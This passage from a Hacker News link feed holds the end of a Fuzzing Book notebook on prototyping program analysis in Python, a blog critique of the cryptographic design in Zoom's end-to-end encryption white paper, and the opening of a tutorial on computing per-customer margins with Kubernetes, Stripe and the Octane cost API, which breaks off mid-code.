<path d="M1161.5,-216C1161.5,-216 1155.5586,-195.9478 1150.9169,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 39 -->
<g id="node40">
<title>39</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1200.5" y="-159.3">Name</text>
</g>
<!-- 34&#45;&#45;39 -->
<g id="edge39">
<title>34--39</title>
<path d="M1161.5,-216C1161.5,-216 1182.2949,-195.9478 1198.541,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 36 -->
<g id="node37">
<title>36</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1001.5" y="-86.3">"b"</text>
</g>
<!-- 35&#45;&#45;36 -->
<g id="edge36">
<title>35--36</title>
<path d="M1065.5,-144C1065.5,-144 1041.7344,-123.9478 1023.1675,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 37 -->
<g id="node38">
<title>37</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1073.5" y="-86.3">Load</text>
</g>
<!-- 35&#45;&#45;37 -->
<g id="edge37">
<title>35--37</title>
<path d="M1065.5,-144C1065.5,-144 1068.4707,-123.9478 1070.7916,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 40 -->
<g id="node41">
<title>40</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1145.5" y="-86.3">"c"</text>
</g>
<!-- 39&#45;&#45;40 -->
<g id="edge40">
<title>39--40</title>
<path d="M1209.5,-144C1209.5,-144 1185.7344,-123.9478 1167.1675,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 41 -->
<g id="node42">
<title>41</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1217.5" y="-86.3">Load</text>
</g>
<!-- 39&#45;&#45;41 -->
<g id="edge41">
<title>39--41</title>
<path d="M1209.5,-144C1209.5,-144 1212.4707,-123.9478 1214.7916,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 43 -->
<g id="node44">
<title>43</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1296.5" y="-159.3">Str</text>
</g>
<!-- 42&#45;&#45;43 -->
<g id="edge43">
<title>42--43</title>
<path d="M1281.8367,-215.8314C1287.4028,-205 1294.4494,-191.2876 1300.0376,-180.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 44 -->
<g id="node45">
<title>44</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1329.5" y="-86.3">"isosceles #2"</text>
</g>
<!-- 43&#45;&#45;44 -->
<g id="edge44">
<title>43--44</title>
<path d="M1314.5468,-143.8314C1317.5555,-133 1321.3646,-119.2876 1324.3852,-108.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 46 -->
<g id="node47">
<title>46</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1496" y="-159.3">Compare</text>
</g>
<!-- 45&#45;&#45;46 -->
<g id="edge46">
<title>45--46</title>
<path d="M1603.5,-216C1603.5,-216 1574.5356,-195.9478 1551.9072,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 54 -->
<g id="node55">
<title>54</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1636" y="-159.3">Return</text>
</g>
<!-- 45&#45;&#45;54 -->
<g id="edge54">
<title>45--54</title>
<path d="M1603.5,-216C1603.5,-216 1625.0376,-195.9478 1641.8638,-180.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 57 -->
<g id="node58">
<title>57</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1768" y="-159.3">Return</text>
</g>
<!-- 45&#45;&#45;57 -->
<g id="edge57">
<title>45--57</title>
<path d="M1603.5,-216C1603.5,-216 1705.4239,-187.0321 1759.9692,-171.5298" fill="none" stroke="#000000"></path>
</g>
<!-- 47 -->
<g id="node48">
<title>47</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1424.5" y="-87.3">Name</text>
</g>
<!-- 46&#45;&#45;47 -->
<g id="edge47">
<title>46--47</title>
<path d="M1523.5,-144C1523.5,-144 1492.6587,-123.6898 1468.8048,-107.9812" fill="none" stroke="#000000"></path>
</g>
<!-- 50 -->
<g id="node51">
<title>50</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1513.5" y="-86.3">Eq</text>
</g>
<!-- 46&#45;&#45;50 -->
<g id="edge50">
<title>46--50</title>
<path d="M1523.5,-144C1523.5,-144 1519.7866,-123.9478 1516.8855,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 51 -->
<g id="node52">
<title>51</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1568.5" y="-87.3">Name</text>
</g>
<!-- 46&#45;&#45;51 -->
<g id="edge51">
<title>46--51</title>
<path d="M1523.5,-144C1523.5,-144 1546.5229,-123.9478 1564.5096,-108.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 48 -->
<g id="node49">
<title>48</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1369.5" y="-14.3">"a"</text>
</g>
<!-- 47&#45;&#45;48 -->
<g id="edge48">
<title>47--48</title>
<path d="M1433.5,-72C1433.5,-72 1409.7344,-51.9478 1391.1675,-36.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 49 -->
<g id="node50">
<title>49</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1441.5" y="-14.3">Load</text>
</g>
<!-- 47&#45;&#45;49 -->
<g id="edge49">
<title>47--49</title>
<path d="M1433.5,-72C1433.5,-72 1436.4707,-51.9478 1438.7916,-36.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 52 -->
<g id="node53">
<title>52</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1513.5" y="-14.3">"c"</text>
</g>
<!-- 51&#45;&#45;52 -->
<g id="edge52">
<title>51--52</title>
<path d="M1577.5,-72C1577.5,-72 1553.7344,-51.9478 1535.1675,-36.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 53 -->
<g id="node54">
<title>53</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1585.5" y="-14.3">Load</text>
</g>
<!-- 51&#45;&#45;53 -->
<g id="edge53">
<title>51--53</title>
<path d="M1577.5,-72C1577.5,-72 1580.4707,-51.9478 1582.7916,-36.2819" fill="none" stroke="#000000"></path>
</g>
<!-- 55 -->
<g id="node56">
<title>55</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1666.5" y="-87.3">Str</text>
</g>
<!-- 54&#45;&#45;55 -->
<g id="edge55">
<title>54--55</title>
<path d="M1666.0422,-143.8314C1668.75,-133 1672.1781,-119.2876 1674.8967,-108.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 56 -->
<g id="node57">
<title>56</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1697.5" y="-14.3">"isosceles #3"</text>
</g>
<!-- 55&#45;&#45;56 -->
<g id="edge56">
<title>55--56</title>
<path d="M1684.0422,-71.8314C1686.75,-61 1690.1781,-47.2876 1692.8967,-36.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 58 -->
<g id="node59">
<title>58</title>
<text fill="#004080" font-family="Courier,monospace" font-size="14.00" font-weight="bold" text-anchor="start" x="1792.5" y="-87.3">Str</text>
</g>
<!-- 57&#45;&#45;58 -->
<g id="edge58">
<title>57--58</title>
<path d="M1796.5281,-143.8314C1798.3333,-133 1800.6187,-119.2876 1802.4311,-108.4133" fill="none" stroke="#000000"></path>
</g>
<!-- 59 -->
<g id="node60">
<title>59</title>
<text fill="#008040" font-family="Courier,monospace" font-size="14.00" text-anchor="middle" x="1828.5" y="-14.3">"scalene"</text>
</g>
<!-- 58&#45;&#45;59 -->
<g id="edge59">
<title>58--59</title>
<path d="M1811.3039,-71.8314C1814.7639,-61 1819.1442,-47.2876 1822.618,-36.4133" fill="none" stroke="#000000"></path>
</g>
</g>
</svg>

</p>

</div><div>

<div>
<pre>['z3.And((a == b), (b == c))',
 'z3.And((a == b), z3.Not(b == c))',
 'z3.And(z3.Not(a == b), (b == c))',
 'z3.And(z3.Not(a == b), z3.Not(b == c), (a == c))',
 'z3.And(z3.Not(a == b), z3.Not(b == c), z3.Not(a == c))']
</pre>
</div>

</div><div>

<div>
<pre>[b = 1, a = 1, c = 1] equilateral
[b = 1, a = 1, c = 2] isosceles #1
[b = 2, a = 1, c = 2] isosceles #2
[b = 2, a = 1, c = 1] isosceles #3
[b = 3, a = 1, c = 2] scalene
</pre>
</div>

</div><div>
<div>
<div>
<div><h2 id="The-Virtues-of-Prototyping">The Virtues of Prototyping<a href="#The-Virtues-of-Prototyping">¬∂</a></h2><p>One neat thing about prototyping (with Python or whatever) is that it allows you to fully focus on your <em>approach</em>, rather than on the infrastructure. Very obviously, this is useful for <em>teaching</em> ‚Äì you can use examples as the ones above in a lecture to very quickly communicate essential techniques of program analysis and test generation.</p>
<p>But prototyping has more advantages. A Jupyter Notebook (like this one) documents how you developed your approach, together with examples, experiments, and rationales ‚Äì and still focusing on the essentials. If you write a tool the "classical" way, you will eventually deliver thousands of lines of code that do everything under the sun, but only once you have implemented everything will you know whether things actually work. This is a huge risk, and if you still have to change things, you will have to refactor things again and again. Furthermore, for anyone who will work on that code later, it will take days, if not weeks, to re-extract the basic idea of the approach, as it will be buried under loads and loads of infrastructure and refactorings.</p>
<p>Our consequence at this point is that we now implement new ideas <em>twice</em>:</p>
<ul>
<li><p>First, we implement things as a notebook (as this one), experimenting with various approaches and parameters until we get them right.</p>
</li>
<li><p>Only once we have the approach right, and if we have confidence that it works, we reimplement it in a tool that works on large scale programs. This can still take weeks to months, but at least we know we are on a good path.</p>
</li>
</ul>
<p>Incidentally, it may well be that the original notebooks will have a longer life, as they are simpler, better documented, and capture the gist of our novel idea. And this is how several of the notebooks in this book came to be.</p>
</div>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://www.fuzzingbook.org/beta/html/PrototypingWithPython.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937438</guid>
            <pubDate>Thu, 29 Oct 2020 23:42:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bizarre Design Choices in Zoom‚Äôs End-to-End Encryption]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 41 (<a href="https://news.ycombinator.com/item?id=24937298">thread link</a>) | @notRobot
<br/>
October 29, 2020 | https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/?hac | <a href="https://web.archive.org/web/*/https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/?hac">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Zoom recently announced that they were going to make end-to-end encryption available to all of their users‚Äìnot just customers.</p>



<figure><div>

</div></figure>



<p>This is a good move, especially for people living in countries with <a href="https://soatok.blog/2020/07/02/how-and-why-america-was-hit-so-hard-by-covid-19/">inept leadership that failed to address the COVID-19 pandemic</a> and therefore need to conduct their work and schooling remotely through software like Zoom. I enthusiastically applaud them for making this change.</p>



<div><figure><img data-attachment-id="1333" data-permalink="https://soatok.blog/soatoktelegrams2020-08/" data-orig-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-08" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png?w=512" src="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png?w=512" alt="" srcset="https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png 512w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png?w=150 150w, https://soatok.files.wordpress.com/2020/09/soatoktelegrams2020-08.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>End-to-end encryption, on by default, is a huge win for everyone who uses Zoom. (Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>.)</figcaption></figure></div>



<p>The end-to-end encryption capability arrives on the heels of their acquisition of <a href="https://keybase.io/">Keybase</a> in earlier this year. Hiring a team of security experts and cryptography engineers seems like a good move overall.</p>



<p>Upon hearing this news, I decided to be a good neighbor and take a look at their source code, with the reasoning, ‚ÄúIf so many people‚Äôs privacy is going to be dependent on Zoom‚Äôs security, I might as well make sure they‚Äôre not doing something ridiculously bad.‚Äù</p>



<p>Except I couldn‚Äôt find their source code anywhere online. But they did publish <a href="https://github.com/zoom/zoom-e2e-whitepaper">a white paper on Github</a>‚Ä¶</p>







<h2>Disclaimers</h2>



<p>What follows is the opinion of some guy on the Internet with a fursona‚Äìso whether or not you choose to take it seriously should be informed by this context. It is not the opinion of anyone‚Äôs employer, nor is it endorsed by Zoom, etc. Tell your lawyers to calm their nips.</p>



<p>More importantly, I‚Äôm not here to hate on Zoom for doing a good thing, nor on the security experts that worked hard on making Zoom better for their users. The responsibility of security professionals is to the users, after all.</p>



<p>Also, these aren‚Äôt zero-days, so don‚Äôt try to lecture me about ‚Äúresponsible‚Äù disclosure. (That term is also <a href="https://adamcaudill.com/2015/11/19/responsible-disclosure-is-wrong/">problematic</a>, by the way.)</p>



<p>Got it? Good. Let‚Äôs move on.</p>







<h2>Bizarre Design Choices in Version 2.3 of Zoom‚Äôs E2E White Paper</h2>



<p>Note: I‚Äôve altered the screenshots to be white text on a black background, since my blog‚Äôs color scheme is darker than a typical academic PDF. You can find the source <a href="https://github.com/zoom/zoom-e2e-whitepaper/blob/d3be2a5a3e16be04f1199b92630f180ba79cb51c/zoom_e2e.pdf">here</a>.</p>



<h3>Cryptographic Algorithms</h3>



<div><figure><img data-attachment-id="1744" data-permalink="https://soatok.blog/zoom-e2e-02/" data-orig-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-02.png" data-orig-size="784,652" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="zoom-e2e-02" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-02.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-02.png?w=580" src="https://soatok.files.wordpress.com/2020/10/zoom-e2e-02.png" alt=""></figure></div>



<p>It‚Äôs a little weird that they‚Äôre calculating a signature over SHA256(Context) || SHA256(M), considering Ed25519 uses SHA512 internally.</p>



<p>It would make just as much sense to sign Context || M directly‚Äìor, if pre-hashing large streams is needed, SHA512(Context || M).</p>



<div><figure><img data-attachment-id="1740" data-permalink="https://soatok.blog/zoom-e2e-01/" data-orig-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-01.png" data-orig-size="1039,788" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="zoom-e2e-01" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-01.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-01.png?w=580" src="https://soatok.files.wordpress.com/2020/10/zoom-e2e-01.png" alt=""></figure></div>



<p>At the top of this section, it says it uses libsodium‚Äôs <code>crypto_box</code> interface. But then they go onto‚Ä¶ not actually use it.</p>



<p>Instead, they wrote their own protocol using HKDF, two SHA256 hashes, and XChaCha20-Poly1305.</p>



<p>While secure, this isn‚Äôt <em>really</em> using the crypto_box interface.</p>



<p>The only part of the libsodium interface that‚Äôs being used is <code><a href="https://github.com/jedisct1/libsodium/blob/927dfe8e2eaa86160d3ba12a7e3258fbc322909c/src/libsodium/crypto_box/curve25519xsalsa20poly1305/box_curve25519xsalsa20poly1305.c#L35-L46">crypto_box_beforenm()</a></code>, which could easily have been a call to <code>crypto_scalarmult()</code>instead (since they‚Äôre passing the output of the scalar multiplication to HKDF anyway).</p>







<p>Also, the SHA256(a) || SHA256(b) pattern returns. Zoom‚Äôs engineers must love SHA256 for some reason.</p>



<p>This time, it‚Äôs in the additional associated data for the XChaCha20-Poly1305. </p>



<p>Binding the ciphertext and the signature to the same context string is a sensible thing to do, it‚Äôs just the concatenation of SHA256 hashes is a bit weird when SHA512 exists.</p>



<h3>Meeting Leader Security Code</h3>



<div><figure><img data-attachment-id="1746" data-permalink="https://soatok.blog/zoom-e2e-03/" data-orig-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-03.png" data-orig-size="760,733" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="zoom-e2e-03" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-03.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-03.png?w=580" src="https://soatok.files.wordpress.com/2020/10/zoom-e2e-03.png" alt=""></figure></div>



<p>Here we see Zoom using the a SHA256 of a constant string (‚Äú<code>Zoombase-1-ClientOnly-MAC-SecurityCode</code>‚Äú) in a construction that tries but fails to be HMAC.</p>



<p>And then they concatenate it with the SHA256 hash of the public key (which is already a 256-bit value), and then they hash the whole thing again.</p>



<p>It‚Äôs redundant SHA256 all the way down. The redundancy of ‚ÄúMAC‚Äù and ‚ÄúSecurityCode‚Äù in their constant string is, at least, consistent with the rest of their design philosophy.</p>



<p>It would be a real shame if double-hashing carried the risk of <a href="https://eprint.iacr.org/2013/382">invalidating security proofs</a>, or if <a href="https://cseweb.ucsd.edu/~mihir/papers/kmd5.pdf">the security proof for HMAC</a> required a high Hamming distance of padding constants and this design decision also later <a href="https://eprint.iacr.org/2012/684.pdf">saved HMAC from related-key attacks</a>.</p>



<h3>Hiding Personal Details</h3>



<figure><img data-attachment-id="1750" data-permalink="https://soatok.blog/zoom-e2e-04/" data-orig-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png" data-orig-size="739,603" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="zoom-e2e-04" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png?w=580" src="https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png?w=739" alt="" srcset="https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png 739w, https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png?w=150 150w, https://soatok.files.wordpress.com/2020/10/zoom-e2e-04.png?w=300 300w" sizes="(max-width: 739px) 100vw, 739px"></figure>



<p>Wait, you‚Äôre telling me Zoom was aware of HMAC‚Äôs existence this whole time?</p>



<div><figure><img data-attachment-id="1202" data-permalink="https://soatok.blog/soatoktelegrams2020-02/" data-orig-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="SoatokTelegrams2020-02" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png?w=512" src="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png?w=512" alt="" srcset="https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png 512w, https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png?w=150 150w, https://soatok.files.wordpress.com/2020/08/soatoktelegrams2020-02.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>I give up!</figcaption></figure></div>



<h2>Enough Pointless Dunking, What‚Äôs the Takeaway?</h2>



<p>None of the design decisions Zoom made that I‚Äôve criticized here are security vulnerabilities, but they do demonstrate an early lack of cryptography expertise in their product design.</p>



<p>After all, the weirdness is almost entirely contained in section 3 of their white paper, which describes the ‚ÄúPhase I‚Äù of their rollout. So what I‚Äôve pointed out here appears to be mostly legacy cruft that wasn‚Äôt risky enough to bother changing in their final design.</p>



<p>The rest of their paper is pretty straightforward and pleasant to read. Their design makes sense in general, and each phase includes an ‚ÄúAreas to Improve‚Äù section.</p>



<p>All in all, if you‚Äôre worried about the security of Zoom‚Äôs E2EE feature, the only thing they can really do better is to publish the source code (and link to it from the whitepaper repository for ease-of-discovery) for this feature so independent experts can publicly review it.</p>



<p>However, they seem to be getting a lot of mileage out of the experts on their payroll, so I wouldn‚Äôt count on that happening.</p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/?hac</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937298</guid>
            <pubDate>Thu, 29 Oct 2020 23:23:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Margin analytics using Kubernetes, Stripe and Octane]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937290">thread link</a>) | @akhanolk
<br/>
October 29, 2020 | https://www.getoctane.io/per-customer-margins-using-stripe-and-kubernetes | <a href="https://web.archive.org/web/*/https://www.getoctane.io/per-customer-margins-using-stripe-and-kubernetes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
          
            
            <figure><img src="https://cdn.spark.app/media/self3/image/blank_diagram_16_0i05x5f_w720.png" alt="Margin analytics"></figure><p><span>[The picture above depicts the results of a real-time margin analysis experiment, overlaying AWS infrastructure costs and Stripe revenue]</span></p><p>A simple (naive?) approach to a complicated problem!</p><p>Let's set the scene. I'm a subscription-based SaaS company running expensive cloud infrastructure (on Kubernetes) that is shared across all of my customers.</p><p>Today, I can approximate my total margin using monthly revenue from Stripe and my infrastructure bill from AWS. However, I have no insights into how each customer contributes to margin. Given <strong>margin per customer</strong>, I could answer several valuable questions:</p><ul><li><strong>Who are my good (high-margin) customers and who are my bad (low/negative-margin) customers?</strong></li><li><strong>How are my margins changing as my business grows?</strong></li><li><strong>How are changes to my products affecting my profits?</strong></li></ul><p>The solution here can be complicated. </p><p>Assuming that my cost is primarily cloud infrastructure costs, to get√Ç&nbsp;<strong>cost per customer*</strong>, first I need to set up monitoring layers to properly measure customer usage. Then, I need to enrich the usage data with cloud prices. To complicate matters further, I need to consolidate and store this data long-term to maintain historical views of my business across my distributed infrastructure. Finally, I need to join this data with√Ç&nbsp;<strong>revenue per customer**</strong>.</p><p>Fortunately, my customers are segmented by jobs (i.e., pods, namespaces, and(or) clusters). In this case,√Ç&nbsp;<strong>cost per customer </strong>is approximately the cost of a customer's namespace. I can track cost per namespace using the <strong><span><a href="https://getoctane.io/">Octane</a></span></strong> Cost API and join my√Ç&nbsp;<strong>revenue per customer</strong>√Ç&nbsp;using the <strong><span><a href="https://stripe.com/">Stripe</a></span></strong> API. Through these integrations, I can extract real-time√Ç&nbsp;<strong>margin per customer</strong>.</p><p><span>[Important to note that we understand that many SaaS companies will not have customers segmented by namespaces. For purposes of blog post we have chosen to simplify the problem]</span></p><p>Here are main components and steps to complete:</p><p><strong>cost per customer</strong>:</p><ol><li>(pre-requisite) set up√Ç&nbsp;<strong><span><a href="https://getoctane.io/">Octane</a></span></strong>√Ç&nbsp;and connect cluster(s) to measure infrastructure costs</li><li>set up Octane accounts to track namespaces (I've chosen to segment customers by namespace for this example)</li><li>fetch costs for the customer accounts</li></ol><p><strong>revenue per customer</strong>:</p><ol><li>(pre-requisite) set up√Ç&nbsp;<span><a href="https://stripe.com/">Stripe</a></span>√Ç&nbsp;to track customer subscriptions</li><li>fetch Stripe subscriptions and compute the expected charge for a given time range</li></ol><p><strong>margin per customer:</strong>√Ç&nbsp;</p><ol><li>formula: (<strong>revenue per customer</strong>√Ç&nbsp;-√Ç&nbsp;<strong>cost per customer</strong>) /√Ç&nbsp;<strong>revenue per customer</strong></li></ol><h2>Getting Started</h2><p>I did some pre-requisite steps to get the data I needed to get real-time cost per customer (Octane) and revenue per customer (Stripe).</p><p><strong>Set up√Ç&nbsp;</strong><strong><span><a href="https://getoctane.io/">Octane</a></span></strong></p><ul><li>Register / Login</li><li>Add Kubernetes cluster</li></ul><p><strong> Set up√Ç&nbsp;</strong><strong><span><a href="https://stripe.com/">Stripe</a></span></strong></p><ul><li>Register / Login</li><li>Create customers</li><li>Add subscriptions for customers</li></ul><h3>Cost per customer</h3><p>Now, that our tools are setup, I need to start leveraging them to get real-time margin. First let's get cost per customer data. I begin by setting up a mapping from the Stripe customer list to the Kubernetes customer namespaces.</p><pre># Import python libraries
import pandas as pd
import pprint
import requests
HOURS_TO_SECONDS = 60.0 * 60.0
# Octane API URL
OCTANE_URL = "https://hasura.cloud.getoctane.io/v1/graphql"
# Set up time range for computing cost and revenue
LOOKBACK_HOURS = 4
START_TIME = pd.Timestamp.utcnow() - pd.Timedelta(hours=LOOKBACK_HOURS)
# Set up mapping from customer to corresponding namespace in Kubernetes clusters
CUSTOMERS = {
    "Slow Sally": {
        "namespace": "slow-sally"
    },
    "Stingy Sid": {
        "namespace": "stingy-sid"
    },
    "Mike SpendALot": {
        "namespace": "mike-spendalot"
    },
    "Jamie Jay": {
        "namespace": "jamie-jay"
    },
    "John Du": {
        "namespace": "john-du"
    }
}</pre><p>Next, I need to send a login request to the Octane API to fetch an access token for further requests.</p><pre>login_mutation = """
mutation Login{
    login(args: {username: "EMAIL_ADDRESS", password: "PASSWORD"}){
        accessToken
    }
}
"""
res = requests.post(OCTANE_URL, json={"query": login_mutation})
if res.status_code != 200:
    raise Exception('Failed login request')
access_token = res.json().get('data', {}).get('login', {}).get('accessToken', "")
auth_headers = {"Authorization": f"Bearer {access_token}"}</pre><p>Once I am authenticated, I need to create an Octane grouping (account) for each customer, specifying the corresponding namespace.</p><pre># addAccount creates a logical grouping of costs in Octane
add_account_mutation = """
mutation AddAccount{
    addAccount(args: {accountName: "%s", aggregationType: "namespace", aggregationRegex: "%s"}){
        id
    }
}
"""
# Loops through CUSTOMERS to create groupings in Octane
for name, details in CUSTOMERS.items():
    add_account_request = {
        "query": add_account_mutation % (name, details["namespace"])
    }
    res = requests.post(OCTANE_URL, json=add_account_request, headers=auth_headers)
    if res.status_code != 200:
        raise Exception('Failed add account request')</pre><h4>Now that Octane knows how to group real-time cloud costs by customer, I am ready to query for those costs. </h4><pre>account_cost_query = """
query CostQuery {
    pod_cost_aggregate(where: {end_time: {_gte: "%s"}, pod: {account_pods: {account: {name: {_eq: "%s" } } } } }) {
        aggregate {
            sum {
                cost
            }
        }
    }
}
"""
for name in CUSTOMERS:
    get_costs_request = {
        "query": account_cost_query % (START_TIME, name)
    }
    res = requests.post(OCTANE_URL, json=get_costs_request, headers=auth_headers)
    if res.status_code != 200:
        raise Exception('Failed getting account costs')
